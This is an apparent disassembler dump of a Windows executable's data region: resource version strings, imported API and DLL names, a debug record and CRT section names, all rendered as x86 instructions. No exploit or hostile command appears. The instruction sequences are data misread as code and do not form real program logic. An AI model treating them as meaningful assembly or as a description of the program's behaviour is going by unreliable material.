  401de5:	add    BYTE PTR [ecx+0x0],ch
  401de8:	je     0x401dea
  401dea:	popa   
  401deb:	add    BYTE PTR [edx+0x0],ah
  401dee:	ins    BYTE PTR es:[edi],dx
  401def:	add    BYTE PTR [ebp+0x0],ah
  401df2:	push   esp
  401df3:	add    BYTE PTR [ecx+0x0],ch
  401df6:	ins    DWORD PTR es:[edi],dx
  401df7:	add    BYTE PTR [ebp+0x0],ah
  401dfa:	jb     0x401dfc
  401dfc:	and    BYTE PTR [eax],al
  401dfe:	data16 add BYTE PTR [ecx+0x0],ah
  401e02:	imul   eax,DWORD PTR [eax],0x65006c
  401e08:	add    BYTE PTR fs:[esi],ch
  401e0b:	add    BYTE PTR [eax],al
  401e0d:	add    BYTE PTR [eax],al
  401e0f:	add    BYTE PTR [ebx+0x0],dl
  401e12:	add    BYTE PTR gs:[edx+0x0],dh
  401e16:	jbe    0x401e18
  401e18:	imul   eax,DWORD PTR [eax],0x650063
  401e1e:	push   esp
  401e1f:	add    BYTE PTR [eax+0x0],ch
  401e22:	jb     0x401e24
  401e24:	add    BYTE PTR gs:[ecx+0x0],ah
  401e28:	add    BYTE PTR fs:[ebp+0x0],cl
  401e2c:	popa   
  401e2d:	add    BYTE PTR [ecx+0x0],ch
  401e30:	outs   dx,BYTE PTR ds:[esi]
  401e31:	add    BYTE PTR [edx],bh
  401e33:	add    BYTE PTR [eax],ah
  401e35:	add    BYTE PTR [ebx+0x0],dl
  401e38:	add    BYTE PTR gs:[eax+eax*1+0x57],dh
  401e3d:	add    BYTE PTR [ecx+0x0],ah
  401e40:	imul   eax,DWORD PTR [eax],0x610074
  401e46:	bound  eax,QWORD PTR [eax]
  401e48:	ins    BYTE PTR es:[edi],dx
  401e49:	add    BYTE PTR [ebp+0x0],ah
  401e4c:	push   esp
  401e4d:	add    BYTE PTR [ecx+0x0],ch
  401e50:	ins    DWORD PTR es:[edi],dx
  401e51:	add    BYTE PTR [ebp+0x0],ah
  401e54:	jb     0x401e56
  401e56:	and    BYTE PTR [eax],al
  401e58:	data16 add BYTE PTR [ecx+0x0],ah
  401e5c:	imul   eax,DWORD PTR [eax],0x65006c
  401e62:	add    BYTE PTR fs:[esi],ch
  401e65:	add    BYTE PTR [eax],al
  401e67:	add    BYTE PTR [ebx+0x0],dl
  401e6a:	add    BYTE PTR gs:[edx+0x0],dh
  401e6e:	jbe    0x401e70
  401e70:	imul   eax,DWORD PTR [eax],0x650063
  401e76:	push   esp
  401e77:	add    BYTE PTR [eax+0x0],ch
  401e7a:	jb     0x401e7c
  401e7c:	add    BYTE PTR gs:[ecx+0x0],ah
  401e80:	add    BYTE PTR fs:[ebp+0x0],cl
  401e84:	popa   
  401e85:	add    BYTE PTR [ecx+0x0],ch
  401e88:	outs   dx,BYTE PTR ds:[esi]
  401e89:	add    BYTE PTR [edx],bh
  401e8b:	add    BYTE PTR [eax],ah
  401e8d:	add    BYTE PTR [ebx+0x0],al
  401e90:	ins    BYTE PTR es:[edi],dx
  401e91:	add    BYTE PTR [ecx+0x0],ah
  401e94:	jae    0x401e96
  401e96:	jae    0x401e98
  401e98:	and    BYTE PTR [eax],al
  401e9a:	jb     0x401e9c
  401e9c:	add    BYTE PTR gs:[edi+0x0],ah
  401ea0:	imul   eax,DWORD PTR [eax],0x740073
  401ea6:	jb     0x401ea8
  401ea8:	popa   
  401ea9:	add    BYTE PTR [eax+eax*1+0x69],dh
  401ead:	add    BYTE PTR [edi+0x0],ch
  401eb0:	outs   dx,BYTE PTR ds:[esi]
  401eb1:	add    BYTE PTR [eax],ah
  401eb3:	add    BYTE PTR [esi+0x0],ah
  401eb6:	popa   
  401eb7:	add    BYTE PTR [ecx+0x0],ch
  401eba:	ins    BYTE PTR es:[edi],dx
  401ebb:	add    BYTE PTR [ebp+0x0],ah
  401ebe:	add    BYTE PTR fs:[eax],al
  401ec1:	add    BYTE PTR [eax],al
  401ec3:	add    BYTE PTR [edi+0x0],dl
  401ec6:	popa   
  401ec7:	add    BYTE PTR [ecx+0x0],ch
  401eca:	je     0x401ecc
  401ecc:	and    BYTE PTR [eax],al
  401ece:	inc    esi
  401ecf:	add    BYTE PTR [ecx+0x0],ah
  401ed2:	imul   eax,DWORD PTR [eax],0x65006c
  401ed8:	add    BYTE PTR fs:[eax],ah
  401edb:	add    BYTE PTR [ecx+0x0],ch
  401ede:	outs   dx,BYTE PTR ds:[esi]
  401edf:	add    BYTE PTR [eax],ah
  401ee1:	add    BYTE PTR [ebp+0x0],cl
  401ee4:	jae    0x401ee6
  401ee6:	add    BYTE PTR [bx+0x0],dl
  401eea:	popa   
  401eeb:	add    BYTE PTR [ecx+0x0],ch
  401eee:	je     0x401ef0
  401ef0:	add    BYTE PTR cs:[eax],al
	...
  401eff:	add    BYTE PTR [ebp+0x0],ch
  401f02:	add    BYTE PTR gs:[edi+0x0],dh
  401f06:	jne    0x401f08
  401f08:	imul   eax,DWORD PTR [eax],0x730066
  401f0e:	outs   dx,DWORD PTR ds:[esi]
  401f0f:	add    BYTE PTR [ecx+0x0],ah
  401f12:	jb     0x401f14
  401f14:	jo     0x401f16
  401f16:	arpl   WORD PTR [eax],ax
  401f18:	jbe    0x401f1a
  401f1a:	js     0x401f1c
  401f1c:	add    BYTE PTR [bx+si+0x0],ch
  401f20:	and    DWORD PTR [eax],eax
  401f22:	add    BYTE PTR [eax],al
  401f24:	sub    dl,BYTE PTR [eax]
  401f26:	or     al,0x0
  401f28:	add    BYTE PTR [eax],al
  401f2a:	add    BYTE PTR [eax],al
  401f2c:	rol    BYTE PTR [eax],0x0
  401f2f:	add    BYTE PTR [eax],al
  401f31:	add    BYTE PTR [eax],al
  401f33:	inc    esi
  401f34:	cmp    BYTE PTR [eax],dl
  401f36:	or     al,0x0
  401f38:	add    BYTE PTR [eax],al
  401f3a:	add    BYTE PTR [eax],al
  401f3c:	rol    BYTE PTR [eax],0x0
  401f3f:	add    BYTE PTR [eax],al
  401f41:	add    BYTE PTR [eax],al
  401f43:	inc    esi
  401f44:	inc    esp
  401f45:	ins    BYTE PTR es:[edi],dx
  401f46:	ins    BYTE PTR es:[edi],dx
  401f47:	push   ebp
  401f48:	outs   dx,BYTE PTR ds:[esi]
  401f49:	jb     0x401fb0
  401f4b:	imul   esi,DWORD PTR [bp+di+0x74],0x65537265
  401f53:	jb     0x401fcb
  401f55:	gs jb  0x401f58
	...
  401f60:	push   edx
  401f61:	add    BYTE PTR [ebp+0x0],dl
  401f64:	push   esi
  401f65:	add    BYTE PTR [ebp+0x0],al
  401f68:	dec    eax
  401f69:	add    BYTE PTR [edi],bh
  401f6b:	add    BYTE PTR [ecx+0x0],cl
  401f6e:	dec    edx
  401f6f:	add    BYTE PTR [eax+eax*1+0x71],al
  401f73:	add    BYTE PTR [eax+0x0],bl
  401f76:	inc    esi
  401f77:	add    BYTE PTR [ecx+0x0],al
  401f7a:	je     0x401f7c
  401f7c:	push   eax
  401f7d:	add    BYTE PTR [ecx+0x0],bl
  401f80:	pop    edx
  401f81:	add    BYTE PTR [eax+eax*1+0x67],ch
  401f85:	add    BYTE PTR [ebp+0x0],ch
  401f88:	outs   dx,BYTE PTR ds:[esi]
  401f89:	add    BYTE PTR [ebx+0x0],ah
  401f8c:	add    BYTE PTR [eax],al
  401f8e:	add    BYTE PTR [eax],al
  401f90:	add    eax,0x75005300
  401f95:	add    BYTE PTR [ebp+0x0],ch
  401f98:	ins    DWORD PTR es:[edi],dx
  401f99:	add    BYTE PTR [ecx+0x0],ah
  401f9c:	jb     0x401f9e
  401f9e:	jns    0x401fa0
  401fa0:	dec    ecx
  401fa1:	add    BYTE PTR [esi+0x0],ch
  401fa4:	data16 add BYTE PTR [edi+0x0],ch
  401fa8:	jb     0x401faa
  401faa:	ins    DWORD PTR es:[edi],dx
  401fab:	add    BYTE PTR [ecx+0x0],ah
  401fae:	je     0x401fb0
  401fb0:	imul   eax,DWORD PTR [eax],0x6e006f
  401fb6:	add    BYTE PTR [eax],al
  401fb8:	inc    esp
  401fb9:	ins    BYTE PTR es:[edi],dx
  401fba:	ins    BYTE PTR es:[edi],dx
  401fbb:	push   edx
  401fbc:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x65537265
  401fc5:	jb     0x40203d
  401fc7:	gs jb  0x401fca
  401fca:	add    BYTE PTR [eax],al
  401fcc:	and    eax,0xc10
  401fd1:	add    BYTE PTR [eax],al
  401fd3:	add    al,al
  401fd5:	add    BYTE PTR [eax],al
  401fd7:	add    BYTE PTR [eax],al
  401fd9:	add    BYTE PTR [eax],al
  401fdb:	inc    esi
  401fdc:	adc    BYTE PTR [esi],dh
  401fde:	inc    eax
  401fdf:	add    BYTE PTR [esi],ch
  401fe1:	add    BYTE PTR [ebp+0x0],ch
  401fe4:	jae    0x401fe6
  401fe6:	imul   eax,DWORD PTR [eax],0x0
	...
  401ff4:	rol    BYTE PTR [eax],0x0
  401ff7:	add    BYTE PTR [eax],al
  401ff9:	add    BYTE PTR [eax],al
  401ffb:	inc    esi
  401ffc:	sbb    al,0x10
  401ffe:	or     al,0x0
  402000:	add    BYTE PTR [eax],al
  402002:	add    BYTE PTR [eax],al
  402004:	rol    BYTE PTR [eax],0x0
  402007:	add    BYTE PTR [eax],al
  402009:	add    BYTE PTR [eax],al
  40200b:	inc    esi
  40200c:	add    DWORD PTR [eax],eax
  40200e:	add    BYTE PTR [eax],al
  402010:	add    BYTE PTR [eax],al
  402012:	add    BYTE PTR [eax],al
  402014:	rol    BYTE PTR [eax],0x0
  402017:	add    BYTE PTR [eax],al
  402019:	add    BYTE PTR [eax],al
  40201b:	inc    esi
  40201c:	add    BYTE PTR [eax],al
  40201e:	add    BYTE PTR [eax],al
  402020:	pusha  
  402021:	inc    esp
  402022:	inc    eax
  402023:	add    BYTE PTR [eax+0x44],ah
  402026:	inc    eax
  402027:	add    BYTE PTR [eax],al
  402029:	ja     0x40206b
  40202b:	add    BYTE PTR [eax+0x44],al
  40202e:	inc    eax
  40202f:	add    al,dh
  402031:	cmp    al,0x40
  402033:	add    al,dh
  402035:	cmp    al,0x40
  402037:	add    BYTE PTR [eax+0x4000404c],dh
  40203d:	inc    ebp
  40203e:	inc    eax
  40203f:	add    BYTE PTR [eax+0x44],ah
  402042:	inc    eax
  402043:	add    BYTE PTR [eax],dh
  402045:	inc    ecx
  402046:	inc    eax
  402047:	add    BYTE PTR [eax+0x4048],al
  40204d:	dec    edx
  40204e:	inc    eax
  40204f:	add    BYTE PTR [eax+0x20004049],dh
  402055:	inc    eax
  402056:	inc    eax
  402057:	add    al,ah
  402059:	dec    esp
  40205a:	inc    eax
  40205b:	add    BYTE PTR [eax+0x4f],ah
  40205e:	inc    eax
  40205f:	add    BYTE PTR [eax-0x4fffbfb1],al
  402065:	inc    edx
  402066:	inc    eax
  402067:	add    al,dh
  402069:	inc    eax
  40206a:	inc    eax
  40206b:	add    al,ah
  40206d:	dec    edi
  40206e:	inc    eax
  40206f:	add    al,dh
  402071:	aas    
  402072:	inc    eax
  402073:	add    BYTE PTR [eax+0x1c00403f],dh
  402079:	adc    BYTE PTR [eax+eax*1],cl
  40207c:	add    BYTE PTR [eax],al
  40207e:	add    BYTE PTR [eax],al
  402080:	rol    BYTE PTR [eax],0x0
  402083:	add    BYTE PTR [eax],al
  402085:	add    BYTE PTR [eax],al
  402087:	inc    esi
	...
  402090:	jb     0x402092
  402092:	jo     0x402094
  402094:	outs   dx,DWORD PTR ds:[esi]
  402095:	add    BYTE PTR [ebp+0x0],ah
  402098:	add    BYTE PTR fs:[ebx+0x0],ah
  40209c:	popa   
  40209d:	add    BYTE PTR [ebp+0x0],ch
  4020a0:	jne    0x4020a2
  4020a2:	jae    0x4020a4
  4020a4:	jbe    0x4020a6
  4020a6:	add    BYTE PTR [eax],al
  4020a8:	and    BYTE PTR [ebx],dh
  4020aa:	inc    eax
  4020ab:	add    BYTE PTR [eax-0x7fffbfcd],al
  4020b1:	xor    eax,DWORD PTR [eax+0x0]
  4020b4:	nop
  4020b5:	xor    eax,DWORD PTR [eax+0x0]
  4020b8:	loopne 0x4020ee
  4020ba:	inc    eax
  4020bb:	add    BYTE PTR [ecx],ch
  4020bd:	adc    BYTE PTR [eax+eax*1],cl
  4020c0:	add    BYTE PTR [eax],al
  4020c2:	add    BYTE PTR [eax],al
  4020c4:	rol    BYTE PTR [eax],0x0
  4020c7:	add    BYTE PTR [eax],al
  4020c9:	add    BYTE PTR [eax],al
  4020cb:	inc    esi
  4020cc:	or     al,BYTE PTR [eax]
  4020ce:	or     eax,0x4c004f00
  4020d3:	add    BYTE PTR [ebp+0x0],al
  4020d6:	xor    eax,DWORD PTR [eax]
  4020d8:	xor    al,BYTE PTR [eax]
  4020da:	add    BYTE PTR [eax],al
  4020dc:	inc    ebx
  4020dd:	outs   dx,DWORD PTR ds:[esi]
  4020de:	dec    ecx
  4020df:	outs   dx,BYTE PTR ds:[esi]
  4020e0:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4020e8:	inc    ebp
  4020e9:	js     0x4020eb
  4020eb:	add    BYTE PTR [ebx+0x6f],al
  4020ee:	inc    ebx
  4020ef:	jb     0x402156
  4020f1:	popa   
  4020f2:	je     0x402159
  4020f4:	dec    ecx
  4020f5:	outs   dx,BYTE PTR ds:[esi]
  4020f6:	jae    0x40216c
  4020f8:	popa   
  4020f9:	outs   dx,BYTE PTR ds:[esi]
  4020fa:	arpl   WORD PTR [ebp+0x0],sp
  4020fd:	add    BYTE PTR [eax],al
  4020ff:	add    BYTE PTR [ebx+0x6f],al
  402102:	dec    ecx
  402103:	outs   dx,BYTE PTR ds:[esi]
  402104:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40210c:	push   ebx
  40210d:	arpl   WORD PTR gs:[ebp+0x72],si
  402111:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x43000000
  402119:	outs   dx,DWORD PTR ds:[esi]
  40211a:	dec    ecx
  40211b:	jae    0x402165
  40211d:	popa   
  40211e:	outs   dx,BYTE PTR ds:[esi]
  40211f:	fs ins BYTE PTR es:[edi],dx
  402121:	gs jb  0x402167
  402124:	outs   dx,DWORD PTR ds:[esi]
  402125:	outs   dx,BYTE PTR ds:[esi]
  402126:	outs   dx,BYTE PTR ds:[esi]
  402127:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  40212c:	add    BYTE PTR [eax],al
  40212e:	add    BYTE PTR [eax],al
  402130:	inc    ebx
  402131:	add    BYTE PTR [edi+0x0],cl
  402134:	dec    ebp
  402135:	add    BYTE PTR [ebx+0x0],al
  402138:	push   esp
  402139:	add    BYTE PTR [eax+eax*1+0x33],cl
  40213d:	add    BYTE PTR [edx],dh
  40213f:	add    BYTE PTR [eax],al
  402141:	add    BYTE PTR [eax],al
  402143:	add    BYTE PTR [ecx+0x6e],cl
  402146:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  40214e:	inc    ebx
  40214f:	outs   dx,DWORD PTR ds:[esi]
  402150:	outs   dx,BYTE PTR ds:[esi]
  402151:	je     0x4021c5
  402153:	outs   dx,DWORD PTR ds:[esi]
  402154:	ins    BYTE PTR es:[edi],dx
  402155:	jae    0x402157
  402157:	add    BYTE PTR [ecx+0x6e],cl
  40215a:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  402162:	inc    ebx
  402163:	outs   dx,DWORD PTR ds:[esi]
  402164:	outs   dx,BYTE PTR ds:[esi]
  402165:	je     0x4021d9
  402167:	outs   dx,DWORD PTR ds:[esi]
  402168:	ins    BYTE PTR es:[edi],dx
  402169:	jae    0x4021b0
  40216b:	js     0x40216d
  40216d:	add    BYTE PTR [eax],al
  40216f:	add    BYTE PTR [ecx+eiz*2+0x73],dl
  402173:	imul   eax,DWORD PTR [ecx+ebp*2+0x61],0x6c
  402178:	outs   dx,DWORD PTR ds:[esi]
  402179:	add    BYTE PTR [bx+si],al
  40217c:	add    BYTE PTR [eax],al
  40217e:	add    BYTE PTR [eax],al
  402180:	push   esi
  402181:	add    BYTE PTR [ebp+0x0],al
  402184:	push   edx
  402185:	add    BYTE PTR [ebx+0x0],dl
  402188:	dec    ecx
  402189:	add    BYTE PTR [edi+0x0],cl
  40218c:	dec    esi
  40218d:	add    BYTE PTR [eax],al
  40218f:	add    BYTE PTR [edi+0x65],al
  402192:	je     0x4021da
  402194:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  40219c:	outs   dx,DWORD PTR ds:[esi]
  40219d:	outs   dx,BYTE PTR ds:[esi]
  40219e:	dec    ecx
  40219f:	outs   dx,BYTE PTR ds:[esi]
  4021a0:	outs   dx,WORD PTR ds:[esi]
  4021a2:	push   ebx
  4021a3:	imul   edi,DWORD PTR [edx+0x65],0x65470057
  4021aa:	je     0x4021f2
  4021ac:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4021b4:	outs   dx,DWORD PTR ds:[esi]
  4021b5:	outs   dx,BYTE PTR ds:[esi]
  4021b6:	dec    ecx
  4021b7:	outs   dx,BYTE PTR ds:[esi]
  4021b8:	outs   dx,WORD PTR ds:[esi]
  4021ba:	push   edi
  4021bb:	add    BYTE PTR [esi+0x65],dl
  4021be:	jb     0x402211
  4021c0:	jne    0x402227
  4021c2:	jb     0x40223d
  4021c4:	push   esi
  4021c5:	popa   
  4021c6:	ins    BYTE PTR es:[edi],dx
  4021c7:	jne    0x40222e
  4021c9:	push   edi
  4021ca:	add    BYTE PTR [eax],al
  4021cc:	inc    ebx
  4021cd:	jb     0x402234
  4021cf:	popa   
  4021d0:	je     0x402237
  4021d2:	push   edi
  4021d3:	popa   
  4021d4:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4021dc:	ins    DWORD PTR es:[edi],dx
  4021dd:	gs jb  0x402237
  4021e0:	add    BYTE PTR [eax],al
  4021e2:	add    BYTE PTR [eax],al
  4021e4:	push   ebx
  4021e5:	gs je  0x40223f
  4021e8:	popa   
  4021e9:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4021f1:	ins    DWORD PTR es:[edi],dx
  4021f2:	gs jb  0x4021f5
  4021f5:	add    BYTE PTR [eax],al
  4021f7:	add    BYTE PTR [ebx+0x61],al
  4021fa:	outs   dx,BYTE PTR ds:[esi]
  4021fb:	arpl   WORD PTR [ebp+0x6c],sp
  4021fe:	push   edi
  4021ff:	popa   
  402200:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  402208:	ins    DWORD PTR es:[edi],dx
  402209:	gs jb  0x40220c
  40220c:	inc    edi
  40220d:	gs je  0x402263
  402210:	jns    0x402285
  402212:	je     0x402279
  402214:	ins    DWORD PTR es:[edi],dx
  402215:	push   edi
  402216:	outs   dx,DWORD PTR ds:[esi]
  402217:	ja     0x40224f
  402219:	xor    al,0x44
  40221b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  402222:	jns    0x40227b
  402224:	add    BYTE PTR [eax],al
  402226:	add    BYTE PTR [eax],al
  402228:	imul   eax,DWORD PTR [eax],0x65
  40222b:	add    BYTE PTR [edx+0x0],dh
  40222e:	outs   dx,BYTE PTR ds:[esi]
  40222f:	add    BYTE PTR [ebp+0x0],ah
  402232:	ins    BYTE PTR es:[edi],dx
  402233:	add    BYTE PTR [ebx],dh
  402235:	add    BYTE PTR [edx],dh
  402237:	add    BYTE PTR [esi],ch
  402239:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40223d:	add    BYTE PTR [eax+eax*1+0x0],ch
  402241:	add    BYTE PTR [eax],al
  402243:	add    BYTE PTR [esi],ch
  402245:	add    BYTE PTR [eax+eax*1+0x4c],al
  402249:	add    BYTE PTR [eax+eax*1+0x0],cl
  40224d:	add    BYTE PTR [eax],al
  40224f:	add    BYTE PTR [ecx+0x0],ah
  402252:	jo     0x402254
  402254:	imul   eax,DWORD PTR [eax],0x6d002d
  40225a:	jae    0x40225c
  40225c:	sub    eax,0x69007700
  402261:	add    BYTE PTR [esi+0x0],ch
  402264:	sub    eax,0x6f006300
  402269:	add    BYTE PTR [edx+0x0],dh
  40226c:	add    BYTE PTR gs:0x65006400,ch
  402273:	add    BYTE PTR [eax+eax*1+0x61],ch
  402277:	add    BYTE PTR [ecx+0x0],bh
  40227a:	ins    BYTE PTR es:[edi],dx
  40227b:	add    BYTE PTR [edi+0x0],ch
  40227e:	popa   
  40227f:	add    BYTE PTR [eax+eax*1+0x2d],ah
  402283:	add    BYTE PTR [eax+eax*1+0x31],ch
  402287:	add    BYTE PTR ds:0x2d003100,ch
  40228d:	add    BYTE PTR [ecx],dh
  40228f:	add    BYTE PTR [esi],ch
  402291:	add    BYTE PTR [eax+eax*1+0x6c],ah
  402295:	add    BYTE PTR [eax+eax*1+0x0],ch
  402299:	add    BYTE PTR [eax],al
  40229b:	add    BYTE PTR [ebx+0x0],cl
  40229e:	inc    ebp
  40229f:	add    BYTE PTR [edx+0x0],dl
  4022a2:	dec    esi
  4022a3:	add    BYTE PTR [ebp+0x0],al
  4022a6:	dec    esp
  4022a7:	add    BYTE PTR [ebx],dh
  4022a9:	add    BYTE PTR [edx],dh
  4022ab:	add    BYTE PTR [esi],ch
  4022ad:	add    BYTE PTR [eax+eax*1+0x4c],al
  4022b1:	add    BYTE PTR [eax+eax*1+0x0],cl
  4022b5:	add    BYTE PTR [eax],al
  4022b7:	add    BYTE PTR [edx+0x65],dl
  4022ba:	jae    0x40232b
  4022bc:	ins    BYTE PTR es:[edi],dx
  4022bd:	jbe    0x402324
  4022bf:	inc    esp
  4022c0:	gs ins BYTE PTR es:[edi],dx
  4022c2:	popa   
  4022c3:	jns    0x402311
  4022c5:	outs   dx,DWORD PTR ds:[esi]
  4022c6:	popa   
  4022c7:	fs gs fs inc ecx
  4022cb:	push   eax
  4022cc:	dec    ecx
  4022cd:	add    BYTE PTR [eax],al
  4022cf:	add    BYTE PTR [edx+0x65],dl
  4022d2:	jae    0x402343
  4022d4:	ins    BYTE PTR es:[edi],dx
  4022d5:	jbe    0x40233c
  4022d7:	inc    esp
  4022d8:	gs ins BYTE PTR es:[edi],dx
  4022da:	popa   
  4022db:	jns    0x402329
  4022dd:	outs   dx,DWORD PTR ds:[esi]
  4022de:	popa   
  4022df:	fs jae 0x402328
  4022e2:	jb     0x402353
  4022e4:	ins    DWORD PTR es:[edi],dx
  4022e5:	inc    esp
  4022e6:	ins    BYTE PTR es:[edi],dx
  4022e7:	ins    BYTE PTR es:[edi],dx
	...
  4022f4:	cmc    
  4022f5:	mov    al,gs:0x55
  4022fb:	add    BYTE PTR [edx],al
  4022fd:	add    BYTE PTR [eax],al
  4022ff:	add    BYTE PTR [eax+eax*1],ah
  402302:	add    BYTE PTR [eax],al
  402304:	mov    eax,0xb8000023
  402309:	pop    ss
  40230a:	add    BYTE PTR [eax],al
  40230c:	add    BYTE PTR [eax],al
  40230e:	add    BYTE PTR [eax],al
  402310:	cmc    
  402311:	mov    al,gs:0x55
  402317:	add    BYTE PTR ds:0x68000000,cl
  40231d:	add    al,BYTE PTR [eax]
  40231f:	add    al,dh
  402321:	and    eax,DWORD PTR [eax]
  402323:	add    al,dh
  402325:	pop    ss
	...
  402346:	add    BYTE PTR [eax],al
  402348:	push   0x0
	...
  402385:	mov    al,0x40
  402387:	add    BYTE PTR [eax+0x2004023],dh
  40238d:	add    BYTE PTR [eax],al
  40238f:	add    BYTE PTR [edx+eiz*8],cl
  402392:	inc    eax
  402393:	add    BYTE PTR [eax],al
  402395:	add    BYTE PTR [eax],al
  402397:	add    BYTE PTR [eax+edx*1],ch
  40239a:	inc    eax
  40239b:	add    BYTE PTR [edi+0x0],cl
  40239e:	add    BYTE PTR [eax],al
  4023a0:	add    BYTE PTR ds:0x1000,dh
	...
  4023ae:	add    BYTE PTR [eax],al
  4023b0:	add    BYTE PTR [eax+eax*1+0x9a8000],dl
  4023b7:	add    BYTE PTR [edx+0x53],dl
  4023ba:	inc    esp
  4023bb:	push   ebx
  4023bc:	sbb    bl,BYTE PTR [ebx+0x51]
  4023bf:	imul   esp,esp,0x6b
  4023c2:	dec    ebp
  4023c3:	dec    ecx
  4023c4:	mov    dh,0xb5
  4023c6:	mov    dh,0x27
  4023c8:	jge    0x402400
  4023ca:	jae    0x402352
  4023cc:	add    DWORD PTR [eax],eax
  4023ce:	add    BYTE PTR [eax],al
  4023d0:	ins    DWORD PTR es:[edi],dx
  4023d1:	jae    0x40243c
  4023d3:	gs js  0x40243b
  4023d6:	arpl   WORD PTR [esi],bp
  4023d8:	jo     0x40243e
  4023da:	bound  eax,QWORD PTR [eax]
	...
  4023f0:	inc    edi
  4023f1:	inc    ebx
  4023f2:	push   esp
  4023f3:	dec    esp
  4023f4:	add    BYTE PTR [eax],dl
  4023f6:	add    BYTE PTR [eax],al
  4023f8:	add    al,0x0
  4023fa:	add    BYTE PTR [eax],al
  4023fc:	cs inc ebx
  4023fe:	push   edx
  4023ff:	push   esp
  402400:	and    al,0x58
  402402:	inc    ebx
  402403:	inc    ecx
  402404:	add    BYTE PTR [eax],al
  402406:	add    BYTE PTR [eax],al
  402408:	add    al,0x10
  40240a:	add    BYTE PTR [eax],al
  40240c:	add    al,0x0
  40240e:	add    BYTE PTR [eax],al
  402410:	cs inc ebx
  402412:	push   edx
  402413:	push   esp
  402414:	and    al,0x58
  402416:	inc    ebx
  402417:	inc    ecx
  402418:	inc    ecx
  402419:	add    BYTE PTR [eax],al
  40241b:	add    BYTE PTR [eax],cl
  40241d:	adc    BYTE PTR [eax],al
  40241f:	add    BYTE PTR [eax],dl
  402421:	add    BYTE PTR [eax],al
  402423:	add    BYTE PTR [esi],ch
  402425:	inc    ebx
  402426:	push   edx
  402427:	push   esp
  402428:	and    al,0x58
  40242a:	inc    ebx
  40242b:	push   ebp
  40242c:	add    BYTE PTR [eax],al
  40242e:	add    BYTE PTR [eax],al
  402430:	sbb    BYTE PTR [eax],dl
  402432:	add    BYTE PTR [eax],al
  402434:	add    al,0x0
  402436:	add    BYTE PTR [eax],al
  402438:	cs inc ebx
  40243a:	push   edx
  40243b:	push   esp
  40243c:	and    al,0x58
  40243e:	inc    ebx
  40243f:	pop    edx
  402440:	add    BYTE PTR [eax],al
  402442:	add    BYTE PTR [eax],al
  402444:	sbb    al,0x10
  402446:	add    BYTE PTR [eax],al
  402448:	add    al,0x0
  40244a:	add    BYTE PTR [eax],al
  40244c:	cs inc ebx
  40244e:	push   edx
  40244f:	push   esp
  402450:	and    al,0x58
  402452:	dec    ecx
  402453:	inc    ecx
  402454:	add    BYTE PTR [eax],al
  402456:	add    BYTE PTR [eax],al
  402458:	and    BYTE PTR [eax],dl
  40245a:	add    BYTE PTR [eax],al
  40245c:	add    al,0x0
  40245e:	add    BYTE PTR [eax],al
  402460:	cs inc ebx
  402462:	push   edx
  402463:	push   esp
  402464:	and    al,0x58
  402466:	dec    ecx
  402467:	inc    ecx
  402468:	inc    ecx
  402469:	add    BYTE PTR [eax],al
  40246b:	add    BYTE PTR [eax+edx*1],ah
  40246e:	add    BYTE PTR [eax],al
  402470:	add    al,0x0
  402472:	add    BYTE PTR [eax],al
  402474:	cs inc ebx
  402476:	push   edx
  402477:	push   esp
  402478:	and    al,0x58
  40247a:	dec    ecx
  40247b:	pop    ecx
  40247c:	add    BYTE PTR [eax],al
  40247e:	add    BYTE PTR [eax],al
  402480:	sub    BYTE PTR [eax],dl
  402482:	add    BYTE PTR [eax],al
  402484:	add    al,0x0
  402486:	add    BYTE PTR [eax],al
  402488:	cs inc ebx
  40248a:	push   edx
  40248b:	push   esp
  40248c:	and    al,0x58
  40248e:	dec    ecx
  40248f:	pop    edx
  402490:	add    BYTE PTR [eax],al
  402492:	add    BYTE PTR [eax],al
  402494:	sub    al,0x10
  402496:	add    BYTE PTR [eax],al
  402498:	mov    eax,DWORD PTR [ecx]
  40249a:	add    BYTE PTR [eax],al
  40249c:	imul   sp,WORD PTR cs:[si+0x73],0x7824
  4024a4:	add    BYTE PTR [eax],al
  4024a6:	add    BYTE PTR [eax],al
  4024a8:	rcl    BYTE PTR [ecx],0x0
  4024ab:	add    al,dh
  4024ad:	adc    DWORD PTR [eax],eax
  4024af:	add    BYTE PTR [esi],ch
  4024b1:	jb     0x402517
  4024b3:	popa   
  4024b4:	je     0x402517
  4024b6:	add    BYTE PTR [eax],al
  4024b8:	mov    al,0x23
  4024ba:	add    BYTE PTR [eax],al
  4024bc:	or     BYTE PTR [eax],al
  4024be:	add    BYTE PTR [eax],al
  4024c0:	cs jb  0x402527
  4024c3:	popa   
  4024c4:	je     0x402527
  4024c6:	and    al,0x73
  4024c8:	js     0x40252e
  4024ca:	popa   
  4024cb:	je     0x40252e
  4024cd:	add    BYTE PTR [eax],al
  4024cf:	add    BYTE PTR [eax-0x5fffffdd],bh
  4024d5:	add    al,BYTE PTR [eax]
  4024d7:	add    BYTE PTR [esi],ch
  4024d9:	jb     0x40253f
  4024db:	popa   
  4024dc:	je     0x40253f
  4024de:	and    al,0x7a
  4024e0:	jp     0x40255c
  4024e2:	bound  esp,QWORD PTR fs:[edi+0x0]
  4024e6:	add    BYTE PTR [eax],al
  4024e8:	pop    eax
  4024e9:	add    BYTE PTR es:[eax],al
  4024ec:	je     0x4024ee
  4024ee:	add    BYTE PTR [eax],al
  4024f0:	cs je  0x402558
  4024f3:	js     0x402569
  4024f5:	and    al,0x64
  4024f7:	imul   eax,DWORD PTR [eax],0xd0000000
  4024fd:	add    BYTE PTR es:[eax],al
  402500:	sub    esi,DWORD PTR [edi+0x0]
  402503:	add    BYTE PTR [esi],ch
  402505:	je     0x40256c
  402507:	js     0x40257d
  402509:	and    al,0x6d
